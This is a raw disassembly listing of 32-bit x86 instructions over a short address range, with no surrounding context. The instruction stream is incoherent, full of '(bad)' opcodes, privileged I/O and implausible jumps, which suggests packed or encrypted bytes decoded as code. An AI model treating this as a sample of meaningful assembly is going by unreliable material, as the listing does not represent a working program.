  41371f:	add    ebx,DWORD PTR [ebx]
  413721:	idiv   DWORD PTR [esi]
  413723:	adc    eax,0x57ead30f
  413728:	lds    edi,FWORD PTR [esi-0x550df6b4]
  41372e:	jmp    0x5d7e0fbb
  413733:	add    ecx,eax
  413735:	cmc    
  413736:	jne    0x413790
  413738:	sub    ebx,ecx
  41373a:	cmp    esp,edi
  41373c:	xor    ecx,ebp
  41373e:	xor    dl,BYTE PTR [ebx]
  413740:	xor    dl,BYTE PTR [edi]
  413742:	jmp    0x4136c6
  413744:	cld    
  413745:	push   ebx
  413746:	jno    0x41379c
  413748:	outs   dx,DWORD PTR ds:[esi]
  413749:	mul    DWORD PTR [esi+0x49f09808]
  41374f:	mov    ah,0x6c
  413751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413752:	(bad)  
  413753:	shl    cl,1
  413755:	sbb    DWORD PTR [edi],eax
  413757:	scas   eax,DWORD PTR es:[edi]
  413758:	sub    eax,0x7d3e3383
  41375d:	pop    eax
  41375e:	mov    edx,0x17975afd
  413763:	push   ebx
  413764:	dec    ecx
  413765:	inc    ebp
  413766:	shl    DWORD PTR [eax],0x87
  413769:	jg     0x4137b1
  41376b:	dec    edx
  41376c:	outs   dx,DWORD PTR ds:[esi]
  41376d:	ins    BYTE PTR es:[edi],dx
  41376e:	aas    
  41376f:	vmaxpd ymm1,ymm5,YMMWORD PTR [esi-0x37ba4814]
  413777:	ret    
  413778:	(bad)  
  413779:	mov    al,ds:0x3afb0825
  41377e:	or     dl,bh
  413780:	stos   DWORD PTR es:[edi],eax
  413781:	mov    bl,0xbd
  413783:	out    dx,eax
  413784:	shl    BYTE PTR [eax],0x21
  413787:	(bad)  
  413788:	cli    
  413789:	stc    
  41378a:	xchg   ebp,eax
  41378b:	adc    edi,DWORD PTR [edx+0x679af5d]
  413791:	test   BYTE PTR [esi-0x6c],dh
  413794:	and    al,0x47
  413796:	adc    BYTE PTR [ebp+0x7e],ah
  413799:	mov    eax,0x1b821815
  41379e:	xor    eax,DWORD PTR [ecx+esi*1]
  4137a1:	pushf  
  4137a2:	(bad)  
  4137a3:	add    esp,DWORD PTR [edx-0x7d]
  4137a6:	push   ss
  4137a7:	and    al,0xa1
  4137a9:	lock push 0x88cd457
  4137af:	jle    0x41382e
  4137b1:	jbe    0x4137ed
  4137b3:	lods   al,BYTE PTR ds:[esi]
  4137b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b5:	in     al,0x42
  4137b7:	lods   al,BYTE PTR ds:[esi]
  4137b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b9:	mov    cs,WORD PTR [ecx]
  4137bb:	in     al,0x11
  4137bd:	shl    BYTE PTR [esi+0x2fe8d93f],1
  4137c3:	jo     0x413801
  4137c5:	cmp    BYTE PTR [esi+0x3d],ch
  4137c8:	(bad)  
  4137c9:	mov    cl,0x5e
  4137cb:	icebp  
  4137cc:	push   ebp
  4137cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ce:	add    eax,0xd76923c4
  4137d3:	pop    edx
  4137d4:	iret   
  4137d5:	or     BYTE PTR [edx],al
  4137d7:	adc    DWORD PTR [ebx+0x4be402bd],0xbf5b887a
  4137e1:	and    BYTE PTR [ebp+0x4a9a045c],al
  4137e7:	or     DWORD PTR [edi-0x43],edx
  4137ea:	pop    eax
  4137eb:	pop    es
  4137ec:	xor    eax,0xd93ec798
  4137f1:	add    eax,0x5ebbc88a
  4137f6:	les    edx,FWORD PTR [eax-0x490bdec5]
  4137fc:	mov    gs,WORD PTR ds:0x915553b0
  413802:	shl    BYTE PTR [ebp+0x6f46d234],cl
  413808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413809:	jle    0x4137ae
  41380b:	mov    eax,0x5b79b225
  413810:	mov    DWORD PTR [ecx-0x47],eax
  413813:	leave  
  413814:	in     al,0xba
  413816:	xchg   edi,eax
  413817:	fsub   QWORD PTR [ecx+0xe5dc6db]
  41381d:	mov    ds,WORD PTR [ebx+0x49ed1a7f]
  413823:	ds inc esi
  413825:	mov    esp,0xd2191c5f
  41382a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41382b:	fdivr  DWORD PTR [edx+0x1528b020]
  413831:	adc    DWORD PTR [edi],0x3cc42eb5
  413837:	lods   eax,DWORD PTR ds:[esi]
  413838:	ss test eax,0xb4b04bd1
  41383e:	cdq    
  41383f:	mov    eax,ds:0x884a94bd
  413844:	call   FWORD PTR [eax+ebp*2+0x6a214117]
  41384b:	out    0x2c,al
  41384d:	clc    
  41384e:	and    bl,al
  413850:	xchg   esp,eax
  413851:	sahf   
  413852:	inc    ebp
  413853:	jo     0x413847
  413855:	and    BYTE PTR [edx],cl
  413857:	or     BYTE PTR [ecx+0x38c553b6],al
  41385d:	mov    WORD PTR [esi],fs
  41385f:	enter  0x24c1,0xd7
  413863:	add    BYTE PTR [edi+0x6b0076a0],cl
  413869:	int3   
  41386a:	or     bh,bl
  41386c:	mov    eax,ds:0xeaabb5e1
  413871:	outs   dx,BYTE PTR ds:[esi]
  413872:	mov    ds:0x15a8cb50,eax
  413877:	pop    es
  413878:	mov    edi,0x7c7e142b
  41387d:	xor    eax,0xf0bd9484
  413882:	add    al,0x8b
  413884:	and    DWORD PTR [edx-0x174984fa],eax
  41388a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388b:	inc    esp
  41388c:	das    
  41388d:	push   es
  41388e:	test   BYTE PTR [edx+0x21],ah
  413891:	jge    0x41385a
  413893:	dec    edx
  413894:	mov    al,0xd0
  413896:	sbb    cl,BYTE PTR [eax+0x1ca4f5e5]
  41389c:	daa    
  41389d:	cli    
  41389e:	and    edx,DWORD PTR [edi]
  4138a0:	lds    esp,FWORD PTR [ebp+0x2a]
  4138a3:	cld    
  4138a4:	int    0x4e
  4138a6:	retf   0xd607
  4138a9:	xlat   BYTE PTR ds:[ebx]
  4138aa:	loope  0x4138de
  4138ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ad:	pop    esp
  4138ae:	xor    edi,DWORD PTR [eax-0x76]
  4138b1:	into   
  4138b2:	iret   
  4138b3:	xor    al,0x8d
  4138b5:	test   BYTE PTR [eax+ecx*1+0x57864f],0x52
  4138bd:	dec    esi
  4138be:	mov    ah,BYTE PTR [ecx+0x21ad9d17]
  4138c4:	rcl    DWORD PTR [ebx-0x7d],cl
  4138c7:	adc    ebp,DWORD PTR [esi+0x36]
  4138ca:	fsubr  DWORD PTR [edx+0x5]
  4138cd:	retf   
  4138ce:	inc    ecx
  4138cf:	sub    dl,dh
  4138d1:	test   al,0xe2
  4138d3:	adc    DWORD PTR [edx+0x475e44f7],edx
  4138d9:	gs int3 
  4138db:	fdiv   DWORD PTR [esp+ebp*4+0x4e]
  4138df:	adc    al,0x74
  4138e1:	(bad)  
  4138e2:	xchg   esi,eax
  4138e3:	sub    BYTE PTR [ebx],dl
  4138e5:	loopne 0x413868
  4138e7:	clc    
  4138e8:	dec    ecx
  4138e9:	int    0x7
  4138eb:	and    al,0x40
  4138ed:	outs   dx,DWORD PTR ds:[esi]
  4138ee:	test   DWORD PTR [esi],esp
  4138f0:	retf   0xc7ef
  4138f3:	retf   0xdce8
  4138f6:	xor    DWORD PTR [edi],edx
  4138f8:	adc    cl,BYTE PTR [edi+eiz*1-0x2e78f2a]
  4138ff:	mov    dl,0x0
  413901:	add    eax,edx
  413903:	cmp    al,0x69
  413905:	xor    bh,dh
  413907:	div    DWORD PTR gs:[ebx+0x3a]
  41390b:	mov    esi,0x5ad0fcae
  413910:	aaa    
  413911:	and    ecx,ecx
  413913:	sbb    BYTE PTR [ecx+ebx*8+0x2516ab9b],bl
  41391a:	test   DWORD PTR [edx+0x7b],eax
  41391d:	fwait
  41391e:	out    0x81,eax
  413920:	test   BYTE PTR [esi+eax*1+0x22],dh
  413924:	dec    BYTE PTR [ebp-0x43]
  413927:	mov    eax,ds:0xbb71c331
  41392c:	sbb    eax,0xafa944f5
  413931:	dec    eax
  413932:	fmul   st,st(5)
  413934:	addr16 pop edi
  413936:	aas    
  413937:	iret   
  413938:	lock and edi,DWORD PTR [ebx]
  41393b:	xchg   esp,eax
  41393c:	add    al,0x9d
  41393e:	cdq    
  41393f:	addr16 inc edi
  413941:	xor    al,0x53
  413943:	(bad)  
  413945:	(bad)  
  413946:	shl    al,1
  413948:	jl     0x41397e
  41394a:	daa    
  41394b:	fbld   TBYTE PTR [edx]
  41394d:	jge    0x4139b5
  41394f:	pop    esi
  413950:	pop    ebx
  413951:	lahf   
  413952:	pop    ds
  413953:	hlt    
  413954:	mov    DWORD PTR [edx+0x1d],ebp
  413957:	mov    dh,0x62
  413959:	mov    eax,0xe022551d
  41395e:	adc    esp,esp
  413960:	and    DWORD PTR [ebx-0x16],ecx
  413963:	pop    edx
  413964:	les    esp,FWORD PTR [esi+0x4a]
  413967:	mov    WORD PTR [ecx],ds
  413969:	mov    ebx,edi
  41396b:	push   ds
  41396c:	cdq    
  41396d:	cmc    
  41396e:	jmp    0x413997
  413970:	mov    ss,WORD PTR [ebp+0x64]
  413973:	and    eax,0xffffff88
  413976:	jae    0x413971
  413978:	pop    edi
  413979:	fimul  DWORD PTR [edi+0x3c]
  41397c:	mov    ebp,DWORD PTR [ecx+0x6e618b14]
  413982:	loop   0x413914
  413984:	inc    eax
  413985:	dec    ebx
  413986:	(bad)  
  413988:	jnp    0x4139b4
  41398a:	dec    edi
  41398b:	cmp    DWORD PTR [ecx-0x65],0x57
  41398f:	add    BYTE PTR [edx-0x6b],al
  413992:	std    
  413993:	jl     0x4139a7
  413995:	and    ah,BYTE PTR [eax-0x20]
  413998:	cli    
  413999:	fbstp  TBYTE PTR [edi]
  41399b:	or     BYTE PTR [ebx-0x6be06fb5],0xc8
  4139a2:	imul   edi,ebx,0xffffffd9
  4139a5:	mov    ah,0xf8
  4139a7:	adc    al,0x31
  4139a9:	mov    gs,WORD PTR [ebx+0x1c]
  4139ac:	push   0xffffffd1
  4139ae:	pop    ds
  4139af:	lods   al,BYTE PTR ds:[esi]
  4139b0:	test   bh,dl
  4139b2:	mov    ds:0x93e1aea7,eax
  4139b7:	mov    al,0x56
  4139b9:	mov    eax,ds:0xf709ebc4
  4139be:	sahf   
  4139bf:	fist   DWORD PTR [esp+edx*1]
  4139c2:	push   es
  4139c3:	add    al,0x8a
  4139c5:	lea    eax,[esi-0x5f]
  4139c8:	xor    al,0x31
  4139ca:	xor    BYTE PTR [edx-0x56],0xf6
  4139ce:	ins    DWORD PTR es:[edi],dx
  4139cf:	mov    eax,0xbe015868
  4139d4:	jno    0x4139e9
  4139d6:	mov    esp,0xe23473bb
  4139db:	(bad)  
  4139dc:	in     al,dx
  4139dd:	cld    
  4139de:	(bad)  
  4139df:	cli    
  4139e0:	and    BYTE PTR [ecx],ah
  4139e2:	mul    DWORD PTR [edx]
  4139e4:	ds jge 0x413a62
  4139e7:	or     DWORD PTR [edx],edx
  4139e9:	aas    
  4139ea:	in     al,dx
  4139eb:	sbb    eax,0x2000632c
  4139f0:	cmp    eax,0x91e78b36
  4139f5:	mov    al,0x5e
  4139f7:	daa    
  4139f8:	mov    dh,0xcc
  4139fa:	mov    esi,0xa4d2f8d5
  4139ff:	mov    DWORD PTR [eax-0x6d48b0a1],esi
  413a05:	sub    eax,0xe1649988
  413a0a:	xchg   DWORD PTR [ebp-0x49],ebx
  413a0d:	add    eax,DWORD PTR [ebx+0x5a439c2]
  413a13:	mov    esi,DWORD PTR ds:0x911e603f
  413a19:	int    0x6b
  413a1b:	and    bl,BYTE PTR [ecx-0x4b47f4ba]
  413a21:	cmp    ecx,0xa2f1f883
  413a27:	dec    eax
  413a28:	pop    ds
  413a29:	jmp    0x413a83
  413a2b:	mov    ds:0xc84b519c,eax
  413a30:	idiv   DWORD PTR [ecx+0x74623dcf]
  413a36:	test   BYTE PTR [ecx-0x7f0710ca],ah
  413a3c:	push   ebx
  413a3d:	xchg   edx,eax
  413a3e:	inc    ebx
  413a3f:	pop    eax
  413a40:	loop   0x413a4f
  413a42:	daa    
  413a43:	inc    ecx
  413a44:	lock jl 0x413a18
  413a47:	cli    
  413a48:	ss jmp 0x5253:0xafae8201
  413a50:	mov    bh,0xfc
  413a52:	pop    ebp
  413a53:	cmp    al,0xd5
  413a55:	(bad)  
  413a56:	enter  0xd1ac,0xc1
  413a5a:	pop    ebx
  413a5b:	(bad)  
  413a5c:	call   ebp
  413a5e:	fstp   QWORD PTR [edx-0x7dd177e2]
  413a64:	(bad)  
  413a65:	and    BYTE PTR [esi-0x35],al
  413a68:	xlat   BYTE PTR ds:[ebx]
  413a69:	mov    edx,?
  413a6b:	imul   edi,DWORD PTR [edi+0x152248dd],0xfffffff5
  413a72:	stos   BYTE PTR es:[edi],al
  413a73:	les    esi,FWORD PTR [edx+edx*1-0x66]
  413a77:	es push ss
  413a79:	out    0x24,al
  413a7b:	adc    edx,DWORD PTR [esi+ecx*4+0x3f]
  413a7f:	or     dh,BYTE PTR [eax-0x46]
  413a82:	stc    
  413a83:	jle    0x413a64
  413a85:	mov    ah,0x51
  413a87:	cmp    eax,0x12149b72
  413a8c:	sbb    esp,DWORD PTR [ecx+0x7c]
  413a8f:	pop    ds
  413a90:	out    0xc9,eax
  413a92:	(bad)  
  413a93:	mov    esp,DWORD PTR [edx+esi*4]
  413a96:	aam    0x85
  413a98:	popf   
  413a99:	xchg   BYTE PTR [eax],ah
  413a9b:	inc    ebp
  413a9c:	adc    al,0x98
  413a9e:	in     al,0x6c
  413aa0:	scas   eax,DWORD PTR es:[edi]
  413aa1:	loop   0x413b21
  413aa3:	test   eax,0x4028ed7
  413aa8:	(bad)  
  413aaa:	ins    BYTE PTR es:[edi],dx
  413aab:	aad    0xe5
  413aad:	push   edi
  413aae:	cs push ebp
  413ab0:	cmp    eax,0x7915098e
  413ab5:	mov    BYTE PTR [edx-0x316cb670],bh
  413abb:	sub    DWORD PTR [eax+edi*8-0x3447c770],ebp
  413ac2:	fnstenv [esi]
  413ac4:	push   ebp
  413ac5:	cmp    eax,0xfc08b94c
  413aca:	sti    
  413acb:	ficomp DWORD PTR [edx]
  413acd:	xor    eax,0x15fcb5c6
  413ad2:	mov    esp,ds
  413ad4:	retf   
  413ad5:	ins    BYTE PTR es:[edi],dx
  413ad6:	xchg   ebx,eax
  413ad7:	test   eax,0xae006ca2
  413adc:	push   edi
  413add:	mov    edi,0x29852e18
  413ae2:	gs pop esp
  413ae4:	and    al,0xa1
  413ae6:	cld    
  413ae7:	jo     0x413ad1
  413ae9:	sub    dl,BYTE PTR [ecx+0x1f096272]
  413aef:	cs mov bh,0x92
  413af2:	or     cl,BYTE PTR [edx]
  413af4:	loop   0x413a78
  413af6:	test   dh,bh
  413af8:	and    al,0xa9
  413afa:	shr    DWORD PTR [edx+ecx*2-0x54e021fe],1
  413b01:	or     DWORD PTR [edi+0x43],ebx
  413b04:	mov    ebx,0xa5fa70c7
  413b09:	push   ss
  413b0a:	sahf   
  413b0b:	jbe    0x413b46
  413b0d:	data16 aad 0xc
  413b10:	or     DWORD PTR [edi],ebp
  413b12:	jo     0x413b7f
  413b14:	add    DWORD PTR [esi],0x4
  413b17:	adc    edi,esp
  413b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b1a:	lods   eax,DWORD PTR ds:[esi]
  413b1b:	mov    bh,0x3c
  413b1d:	cld    
  413b1e:	mov    edi,0x1fc84c01
  413b23:	add    bl,bl
  413b25:	jecxz  0x413b62
  413b27:	faddp  st(6),st
  413b29:	cmp    BYTE PTR [ebx],cl
  413b2b:	xchg   edi,eax
  413b2c:	sbb    eax,0x49179b8f
  413b31:	sub    bl,BYTE PTR [ebx+0x9af990d]
  413b37:	push   esi
  413b38:	push   0xffffffa8
  413b3a:	add    eax,0x2017da93
  413b3f:	(bad)  
  413b40:	mov    eax,0x5af7dfe6
  413b46:	dec    ebx
  413b47:	push   ebp
  413b48:	push   es
  413b49:	dec    esp
  413b4a:	inc    edx
  413b4b:	pop    esi
  413b4c:	adc    eax,DWORD PTR [eax]
  413b4e:	jle    0x413b8a
  413b50:	(bad)  
  413b51:	push   ss
  413b52:	push   edi
  413b53:	mov    dl,0x50
  413b55:	pop    ds
  413b56:	cdq    
  413b57:	aad    0xf5
  413b59:	bound  esp,QWORD PTR [ebx]
  413b5b:	aam    0x90
  413b5d:	mov    edi,0x904704bf
  413b62:	push   0x2c
  413b64:	sbb    esp,DWORD PTR [ebx+0x4f]
  413b67:	mov    edx,0xbda48414
  413b6c:	cmp    al,0x5
  413b6e:	jae    0x413b82
  413b70:	retf   
  413b71:	mov    esi,0xed9eab52
  413b76:	sub    ah,BYTE PTR [ecx+0xe]
  413b79:	stos   DWORD PTR es:[edi],eax
  413b7a:	repnz jecxz 0x413b26
  413b7d:	add    BYTE PTR [eax],bl
  413b7f:	in     eax,0xc3
  413b81:	sbb    BYTE PTR [ecx],al
  413b83:	loopne 0x413b46
  413b85:	ret    0x7ad8
  413b88:	or     edi,DWORD PTR [edi+0x70]
  413b8b:	mov    bh,0x41
  413b8d:	(bad)  
  413b8e:	lock mov ah,BYTE PTR [eax-0x3e4eb42c]
  413b95:	(bad)  
  413b96:	clc    
  413b97:	lahf   
  413b98:	sub    BYTE PTR [ebp+0x6c42db02],bl
  413b9e:	aas    
  413b9f:	push   edi
  413ba0:	xlat   BYTE PTR ds:[ebx]
  413ba1:	mov    ds:0xab2f5977,al
  413ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ba7:	inc    esi
  413ba8:	pop    ebx
  413ba9:	push   es
  413baa:	mov    ah,0x9b
  413bac:	jmp    0x401f2c75
  413bb1:	sub    BYTE PTR [edi+0x5fd21a3f],bl
  413bb7:	idiv   DWORD PTR [edx+0xe]
  413bba:	test   BYTE PTR [eax],dl
  413bbc:	inc    edx
  413bbd:	jl     0x413bed
  413bbf:	dec    eax
  413bc0:	rol    DWORD PTR [ebp+edi*4+0x27c8c9ca],1
  413bc7:	jmp    0x5407:0xedc273df
  413bce:	add    al,0x4f
  413bd0:	push   esp
  413bd1:	or     DWORD PTR [ebx+0x41],0xffffffe3
  413bd5:	dec    ebp
  413bd6:	and    edx,DWORD PTR [edi]
  413bd8:	lea    edx,[esi]
  413bda:	outs   dx,DWORD PTR ds:[esi]
  413bdb:	mov    cs,edx
  413bdd:	mov    eax,ds:0x65a84595
  413be2:	xor    al,BYTE PTR [eax+0x6b]
  413be5:	mov    ebp,0x28903b5d
  413bea:	or     cl,BYTE PTR [eax-0x320fc009]
  413bf0:	lock int3 
  413bf2:	pop    esp
  413bf3:	repnz cmp edi,esp
  413bf6:	in     al,0x25
  413bf8:	mov    DWORD PTR [ebx],0xacd0b083
  413bfe:	cmp    BYTE PTR [esi+0x44],dh
  413c01:	cmp    eax,esi
  413c03:	loop   0x413bf4
  413c05:	ror    dl,0x33
  413c08:	fist   DWORD PTR [ebx]
  413c0a:	test   BYTE PTR [ebp+0x674932b1],cl
  413c10:	imul   ebp,DWORD PTR [edx],0xffffffd1
  413c13:	jmp    0x9e9bbe07
  413c18:	sub    DWORD PTR [edx+eax*4],eax
  413c1b:	push   ebx
  413c1c:	jge    0x413c3f
  413c1e:	push   ebp
  413c1f:	or     DWORD PTR [ebx+esi*4-0x40482016],edx
  413c26:	fucomp st(6)
  413c28:	sbb    esp,0x6
  413c2b:	inc    eax
  413c2c:	adc    esi,DWORD PTR [eax-0x6b1315d6]
  413c32:	xchg   edx,eax
  413c33:	and    ebx,ebp
  413c35:	fs mov esi,0x4540dbb7
  413c3b:	jb     0x413bd5
  413c3d:	mov    BYTE PTR [eax],dl
  413c3f:	and    al,0x49
  413c41:	push   esi
  413c42:	push   esp
  413c43:	mov    ds:0x2ee2eeeb,eax
  413c48:	test   eax,0xe2bd422b
  413c4d:	mov    edx,0xcc0324b8
  413c52:	fs mov eax,0xd7796d6b
  413c58:	lock setnp al
  413c5c:	push   0x75
  413c5e:	sbb    bh,BYTE PTR [esi+0x62]
  413c61:	fcomp  QWORD PTR es:[edi-0x7]
  413c65:	push   0x8d6e3193
  413c6a:	push   eax
  413c6b:	ds jne 0x413cc5
  413c6e:	mov    esi,esp
  413c70:	stos   DWORD PTR es:[edi],eax
  413c71:	outs   dx,DWORD PTR ds:[esi]
  413c72:	jmp    0x54daba5c
  413c77:	hlt    
  413c78:	fsub   QWORD PTR [edi]
  413c7a:	das    
  413c7b:	mov    WORD PTR ds:0xa686818b,es
  413c81:	mov    esi,DWORD PTR [eax+0x1e]
  413c84:	sbb    DWORD PTR [ebp-0x8],0xffffffff
  413c88:	ror    BYTE PTR [bp+si-0xc6a],cl
  413c8d:	ss in  al,dx
  413c8f:	jg     0x413cef
  413c91:	repz fcom st(7)
  413c94:	and    eax,0xe1ae3926
  413c99:	jnp    0x413d08
  413c9b:	(bad)  
  413c9c:	mov    eax,0xb0231ed0
  413ca1:	inc    ebx
  413ca2:	or     eax,0x64a0af57
  413ca7:	xchg   BYTE PTR [edi+0x6b],bl
  413caa:	push   eax
  413cab:	inc    ebp
  413cac:	xchg   BYTE PTR [edi-0x14157c2],ah
  413cb2:	jge    0x413ca2
  413cb4:	mov    ch,0x9e
  413cb6:	leave  
  413cb7:	test   eax,0xc6696e56
  413cbc:	pop    ss
  413cbd:	je     0x413cc1
  413cbf:	dec    edx
  413cc0:	mov    bl,0x98
  413cc2:	les    ebx,FWORD PTR [esi+eiz*4]
  413cc5:	aaa    
  413cc6:	stos   BYTE PTR es:[edi],al
  413cc7:	jbe    0x413c9a
  413cc9:	pop    ds
  413cca:	xchg   ecx,eax
  413ccb:	pop    ebx
  413ccc:	mov    ebx,DWORD PTR ds:0xfbb81e4e
  413cd2:	pop    ecx
  413cd3:	sti    
  413cd4:	cmp    BYTE PTR ds:0xd2cdad52,ch
  413cda:	inc    ecx
  413cdb:	mov    ds:0xc0738414,al
  413ce0:	shl    BYTE PTR [ebx+eiz*1-0x14],cl
  413ce4:	int3   
  413ce5:	dec    eax
  413ce6:	dec    esp
  413ce7:	adc    dh,bl
  413ce9:	fsubr  DWORD PTR [edi+0x37]
  413cec:	mov    BYTE PTR [eax],cl
  413cee:	mov    ds:0x515eb12e,eax
  413cf3:	(bad)  
  413cf5:	mov    ebx,0x34ca366e
  413cfa:	sbb    ebx,DWORD PTR [ebp-0x7c6a8fc4]
  413d00:	jb     0x413c8a
  413d02:	mov    ecx,0x1bddbc65
  413d07:	test   BYTE PTR [ebx],ah
  413d09:	dec    esp
  413d0a:	scas   eax,DWORD PTR es:[edi]
  413d0b:	push   ebx
  413d0c:	mov    DWORD PTR [ebp-0x18b65fb0],edx
  413d12:	(bad)  
  413d13:	mov    ch,0x53
  413d15:	les    edi,FWORD PTR [edx]
  413d17:	pop    ebp
  413d18:	xchg   BYTE PTR [esi+0x42aa1172],dh
  413d1e:	jg     0x413d79
  413d20:	or     DWORD PTR [edx-0x6a],ebp
  413d23:	xor    eax,0x1b42ae5
  413d28:	pop    eax
  413d29:	(bad)  
  413d2a:	mov    bl,0xc0
  413d2c:	fs adc dh,bh
  413d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d30:	jl     0x413d57
  413d32:	mov    dh,0xf6
  413d34:	pop    edx
  413d35:	pop    edx
  413d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d37:	ret    0xa8ab
  413d3a:	add    DWORD PTR [ebx],0xffffffe1
  413d3d:	ss out 0x14,eax
  413d40:	frstor [ebx]
  413d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d43:	and    dh,BYTE PTR [ebp-0x28638e39]
  413d49:	push   esp
  413d4a:	push   edx
  413d4b:	loop   0x413d1d
  413d4d:	sub    DWORD PTR [edx+0x445432fb],0x9
  413d54:	mul    DWORD PTR [eax+0x2126ba89]
  413d5a:	jnp    0x413d3f
  413d5c:	or     dl,dl
  413d5e:	mov    ebp,0x36019a7c
  413d63:	(bad)  
  413d64:	fadd   st(1),st
  413d66:	inc    ecx
  413d67:	lds    esp,FWORD PTR [edx]
  413d69:	push   ecx
  413d6a:	jle    0x413d1a
  413d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d6d:	adc    edi,DWORD PTR [eax+0x0]
  413d70:	push   es
  413d71:	mov    bl,0x33
  413d73:	rcl    cl,cl
  413d75:	jb     0x413d26
  413d77:	adc    al,0xaa
  413d79:	inc    edx
  413d7a:	adc    BYTE PTR [ecx-0xf],ah
  413d7d:	jno    0x413d52
  413d7f:	loope  0x413d55
  413d81:	stc    
  413d82:	fadd   DWORD PTR [ebx-0x5c8b631e]
  413d88:	xor    BYTE PTR [edx],bl
  413d8a:	mov    ecx,0x7747f5
  413d8f:	push   edx
  413d90:	pop    ds
  413d91:	mov    dl,0xa5
  413d93:	and    BYTE PTR [ebx+ebx*4-0x71],0x5
  413d98:	aad    0xb9
  413d9a:	fs sti 
  413d9c:	mov    bh,0x36
  413d9e:	xor    BYTE PTR [esi+0x76],bh
  413da1:	sub    eax,0xdf6a6ad9
  413da6:	aaa    
  413da7:	xchg   esp,eax
  413da8:	push   ds
  413da9:	pushf  
  413daa:	int3   
  413dab:	dec    edx
  413dac:	add    ebp,esp
  413dae:	les    eax,FWORD PTR [edi+0x24]
  413db1:	into   
  413db2:	jne    0x413d5e
  413db4:	ds push edx
  413db6:	rol    DWORD PTR [esi],1
  413db8:	mov    eax,ecx
  413dba:	pop    es
  413dbb:	lahf   
  413dbc:	adc    esp,edx
  413dbe:	jg     0x413d40
  413dc0:	mov    cl,0x64
  413dc2:	clc    
  413dc3:	punpckhbw mm3,QWORD PTR [ecx]
  413dc6:	js     0x413e05
  413dc8:	pop    ebx
  413dc9:	pop    ecx
  413dca:	(bad)  
  413dcb:	jle    0x413d85
  413dcd:	inc    ecx
  413dce:	js     0x413de6
  413dd0:	pop    eax
  413dd1:	test   eax,0xc2b80af5
  413dd6:	out    dx,eax
  413dd7:	sbb    dl,ah
  413dd9:	mov    al,0xfb
  413ddb:	dec    esp
  413ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ddd:	mov    ecx,0xefba308a
  413de2:	or     DWORD PTR [edx+0x37],ebx
  413de5:	pop    ebp
  413de6:	retf   
  413de7:	pop    ss
  413de8:	sbb    eax,0xc8790bf9
  413ded:	ins    BYTE PTR es:[edi],dx
  413dee:	adc    ch,BYTE PTR [eax+0x23147427]
  413df4:	mov    eax,0xb9318047
  413df9:	jle    0x413dd3
  413dfb:	rcl    BYTE PTR [edx],0x87
  413dfe:	xchg   ebx,eax
  413dff:	inc    edi
  413e00:	psubsw mm2,QWORD PTR [eax-0x46]
  413e04:	push   eax
  413e05:	cmp    eax,0x543c5f02
  413e0a:	rol    BYTE PTR [ecx],cl
  413e0c:	(bad)  
  413e0d:	cmp    al,0x79
  413e0f:	hlt    
  413e10:	(bad)  
  413e11:	sti    
  413e12:	sub    DWORD PTR [eax-0x5b55ed3d],esp
  413e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e19:	ss cwde 
  413e1b:	lock mov cl,0x78
  413e1e:	leave  
  413e1f:	cmp    ah,BYTE PTR [eax-0x40642372]
  413e25:	test   al,0x86
  413e27:	pop    esp
  413e28:	xchg   esi,eax
  413e29:	data16 fs aaa 
  413e2c:	push   edx
  413e2d:	jl     0x413eaa
  413e2f:	jle    0x413e72
  413e31:	ds hlt 
  413e33:	push   esi
  413e34:	push   ebx
  413e35:	sbb    BYTE PTR [ebx+0x6c6a588f],0x8e
  413e3c:	(bad)  
  413e3d:	adc    cl,bh
  413e3f:	pop    ebp
  413e40:	inc    esi
  413e41:	mov    ah,bl
  413e43:	ror    bh,cl
  413e45:	arpl   WORD PTR [ecx-0x2b7bab89],ax
  413e4b:	aas    
  413e4c:	repnz out dx,eax
  413e4e:	loope  0x413e43
  413e50:	lods   al,BYTE PTR ds:[esi]
  413e51:	popf   
  413e52:	and    esp,ebp
  413e54:	jge    0x413e59
  413e56:	jnp    0x413e12
  413e58:	in     eax,dx
  413e59:	dec    eax
  413e5a:	fmul   st(7),st
  413e5c:	ret    0xa992
  413e5f:	scas   eax,DWORD PTR es:[edi]
  413e60:	fiadd  DWORD PTR [eax]
  413e62:	and    esi,DWORD PTR [ebx+0x70ed7765]
  413e68:	(bad)  
  413e69:	call   0xb5a58a33
  413e6e:	xchg   esi,eax
  413e6f:	mov    DWORD PTR [edx-0x118ecdba],ebx
  413e75:	es sub eax,0x8f6f08fe
  413e7b:	mov    bl,0xe8
  413e7d:	jmp    0x413e71
  413e7f:	mov    eax,0xf41a5d7a
  413e84:	mov    al,ds:0x1167ee9d
  413e89:	push   ebx
  413e8a:	(bad)  
  413e8b:	mov    esi,0xbdd1faf5
  413e90:	mov    ch,cl
  413e92:	fstp   QWORD PTR [ebx-0x9]
  413e95:	fcomp  QWORD PTR [ebx-0x27ccb104]
  413e9b:	xchg   ecx,eax
  413e9c:	or     esi,edi
  413e9e:	push   ss
  413e9f:	sub    ch,0x7
  413ea2:	jle    0x413e94
  413ea4:	pop    edx
  413ea5:	(bad)  
  413ea6:	jns    0x413ecd
  413ea8:	popf   
  413ea9:	leave  
  413eaa:	sar    BYTE PTR [esi],1
  413eac:	out    dx,eax
  413ead:	stos   DWORD PTR es:[edi],eax
  413eae:	sbb    al,0x9c
  413eb0:	mov    DWORD PTR [ecx-0x3b],esi
  413eb3:	fcmovbe st,st(4)
  413eb5:	inc    edi
  413eb6:	jno    0x413e46
  413eb8:	shr    al,1
  413eba:	inc    ecx
  413ebb:	sti    
  413ebc:	push   es
